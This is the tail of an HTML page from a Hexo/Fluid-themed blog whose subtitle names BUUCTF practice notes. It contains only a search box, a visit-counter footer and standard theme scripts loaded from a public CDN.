        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
  

  

  <footer class="text-center mt-5 py-3">
  <div class="footer-content">
     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
  </div>
  
  <div class="statistics">
    
    

    
      
        <!-- LeanCloud 统计PV -->
        <span id="leancloud-site-pv-container" style="display: none">
            总访问量 
            <span id="leancloud-site-pv"></span>
             次
          </span>
      
      
        <!-- LeanCloud 统计UV -->
        <span id="leancloud-site-uv-container" style="display: none">
            总访客数 
            <span id="leancloud-site-uv"></span>
             人
          </span>
      

    
  </div>


  

  
</footer>

<!-- SCRIPTS -->
<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
<script  src="/js/debouncer.js" ></script>
<script  src="/js/main.js" ></script>

<!-- Plugins -->


  
    <script  src="/js/lazyload.js" ></script>
  



  



  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
  <script  src="/js/clipboard-use.js" ></script>







  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
  <script>
    $(document).ready(function () {
      var boardCtn = $('#board-ctn');
      var boardTop = boardCtn.offset().top;

      tocbot.init({
        tocSelector: '#tocbot',
        contentSelector: '#post-body',
        headingSelector: 'h1,h2,h3,h4,h5,h6',
        linkClass: 'tocbot-link',
        activeLinkClass: 'tocbot-active-link',
        listClass: 'tocbot-list',
        isCollapsedClass: 'tocbot-is-collapsed',
        collapsibleClass: 'tocbot-is-collapsible',
        collapseDepth: 0,
        scrollSmooth: true,
        headingsOffset: -boardTop
      });
      if ($('.toc-list-item').length > 0) {
        $('#toc').css('visibility', 'visible');
      }
    });
  </script>



  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
  <script>
    var typed = new Typed('#subtitle', {
      strings: [
        '  ',
        "BUUCTF 刷题记录&nbsp;",
      ],
      cursorChar: "_",
      typeSpeed: 70,
      loop: false,
    });
    typed.stop();
    $(document).ready(function () {
      $(".typed-cursor").addClass("h2");
      typed.start();
    });
  </script>



  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
  <script>
    anchors.options = {
      placement: "left",
      visible: "hover",
      
      icon: "#"
      
    };
    var el = "h1,h2,h3,h4,h5,h6".split(",");
    var res = [];
    for (item of el) {
      res.push(".markdown-body > " + item)
    }
    anchors.add(res.join(", "))
  </script>



  <script  src="/js/local-search.js" ></script>
  <script>
    var path = "/local-search.xml";
    var inputArea = document.querySelector("#local-search-input");
    inputArea.onclick = function () {
      searchFunc(path, 'local-search-input', 'local-search-result');
      this.onclick = null
    }
  </script>



  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />

  <script>
    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
      function () {
        var element = document.createElement('a');
        $(element).attr('data-fancybox', 'images');
        $(element).attr('href', $(this).attr('src'));
        $(this).wrap(element);
      }
    );
  </script>












  

  

  

  

  

  





</body>
</html>
